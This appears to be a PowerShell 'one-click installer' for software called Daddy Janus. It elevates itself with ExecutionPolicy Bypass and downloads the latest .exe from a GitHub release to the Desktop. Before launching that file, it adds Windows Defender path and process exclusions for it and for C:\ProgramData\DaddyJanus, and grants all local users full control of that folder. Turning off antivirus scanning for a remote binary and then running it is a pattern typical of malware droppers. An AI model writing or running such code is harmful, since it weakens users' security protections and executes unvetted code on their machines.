# ===============================================================================
#   DADDY JANUS ONE-CLICK INSTALLER — GitHub Auto-Updater & Safe-Zone Setup
# ===============================================================================
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# ── 1. Admin Privilege Elevation Check ───────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[DaddyJanus] Requesting Administrator privileges for Defender exclusions..." -ForegroundColor Yellow
    try {
        if ($PSCommandPath) {
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
            exit
        } else {
            $tmpScript = Join-Path $env:TEMP "DaddyJanus_Install.ps1"
            (New-Object System.Net.WebClient).DownloadFile(
                "https://raw.githubusercontent.com/Contrary7/Dnvo-Janus/main/install-janus.ps1",
                $tmpScript
            )
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmpScript`"" -Verb RunAs -ErrorAction Stop
            exit
        }
    } catch {
        Write-Host "[DaddyJanus] Continuing without elevated permissions..." -ForegroundColor Yellow
    }
}

# ── 2. Header Banner ──────────────────────────────────────────────────────────
Clear-Host
Write-Host "====================================================" -ForegroundColor Cyan
Write-Host "       DADDY JANUS AUTOMATED INSTALLER              " -ForegroundColor Magenta
Write-Host "====================================================" -ForegroundColor Cyan
Write-Host ""

# ── 3. Fetch Latest Release Details from GitHub ────────────────────────────────
Write-Host "[DaddyJanus] Connecting to GitHub repository (Contrary7/Dnvo-Janus)..." -ForegroundColor Cyan

try {
    $apiUrl = "https://api.github.com/repos/Contrary7/Dnvo-Janus/releases/latest"
    $headers = @{ "User-Agent" = "DaddyJanusInstaller" }
    $release = Invoke-RestMethod -Uri $apiUrl -Headers $headers
    $asset = $release.assets | Where-Object { $_.name -like "*.exe" } | Select-Object -First 1

    if (-not $asset) {
        throw "No executable asset found in latest release ($($release.tag_name))."
    }

    $sizeMb = [math]::Round($asset.size / 1MB, 1)
    Write-Host "[DaddyJanus] Found latest release: $($release.tag_name) ($sizeMb MB)" -ForegroundColor Green

    $desktop = [Environment]::GetFolderPath("Desktop")
    $destPath = Join-Path $desktop $asset.name

    # ── 4. Defender & Safe-Zone Pre-Exclusions ─────────────────────────────────
    Write-Host "[DaddyJanus] Pre-registering Defender path & process exclusions..." -ForegroundColor Yellow
    try { Add-MpPreference -ExclusionPath $destPath -ErrorAction SilentlyContinue } catch {}
    try { Add-MpPreference -ExclusionProcess $asset.name -ErrorAction SilentlyContinue } catch {}

    $djTempDir = "C:\ProgramData\DaddyJanus\tmp"
    if (-not (Test-Path $djTempDir)) {
        New-Item -ItemType Directory -Path $djTempDir -Force | Out-Null
    }
    try { & icacls "C:\ProgramData\DaddyJanus" /grant "*S-1-5-32-545:(OI)(CI)F" /C /Q | Out-Null } catch {}
    try { Add-MpPreference -ExclusionPath "C:\ProgramData\DaddyJanus" -ErrorAction SilentlyContinue } catch {}
    try { Add-MpPreference -ExclusionPath $djTempDir -ErrorAction SilentlyContinue } catch {}

    # ── 5. High-Speed Animated Console Downloader ──────────────────────────────
    Write-Host ""
    Write-Host "[DaddyJanus] Downloading $($asset.name) ($sizeMb MB)..." -ForegroundColor Cyan

    $webRequest = [System.Net.HttpWebRequest]::Create($asset.browser_download_url)
    $webRequest.UserAgent = "DaddyJanusInstaller"
    $webResponse = $webRequest.GetResponse()
    $totalBytes = $webResponse.ContentLength
    $responseStream = $webResponse.GetResponseStream()
    $targetStream = [System.IO.File]::Create($destPath)

    $buffer = New-Object byte[] 65536
    $downloadedBytes = 0
    $startTime = [System.DateTime]::Now
    $lastUpdate = [System.DateTime]::Now
    $spinChars = @('|', '/', '-', '\')
    $spinIndex = 0

    while (($read = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $targetStream.Write($buffer, 0, $read)
        $downloadedBytes += $read

        $now = [System.DateTime]::Now
        if (($now - $lastUpdate).TotalMilliseconds -ge 100) {
            $lastUpdate = $now
            $elapsedSeconds = ($now - $startTime).TotalSeconds
            $speed = if ($elapsedSeconds -gt 0) { $downloadedBytes / $elapsedSeconds } else { 0 }

            $pct = if ($totalBytes -gt 0) { [math]::Min(100, [math]::Round(($downloadedBytes / $totalBytes) * 100)) } else { 0 }
            $currMB = [math]::Round($downloadedBytes / 1MB, 1)
            $totalMB = if ($totalBytes -gt 0) { [math]::Round($totalBytes / 1MB, 1) } else { "?" }
            $speedMB = [math]::Round($speed / 1MB, 2)

            $barWidth = 25
            $filledWidth = [math]::Round(($pct / 100) * $barWidth)
            $unfilledWidth = $barWidth - $filledWidth
            $bar = ("=" * $filledWidth) + ("-" * $unfilledWidth)

            $spin = $spinChars[$spinIndex % $spinChars.Length]
            $spinIndex++

            $statusLine = "  [$spin] [$bar] $pct% | $currMB / $totalMB MB | $speedMB MB/s    "
            Write-Host "`r$statusLine" -NoNewline -ForegroundColor Cyan
        }
    }

    $targetStream.Close()
    $responseStream.Close()
    $webResponse.Close()

    Write-Host "`r  [+] [=========================] 100% | Download Complete!                         " -ForegroundColor Green
    Write-Host ""

    # ── 6. Launch Setup ────────────────────────────────────────────────────────
    Write-Host "[DaddyJanus] Launching setup executable..." -ForegroundColor Green
    Start-Process $destPath

} catch {
    $err = $_
    Write-Host ""
    Write-Host "[DaddyJanus] Installation failed: $err" -ForegroundColor Red
}
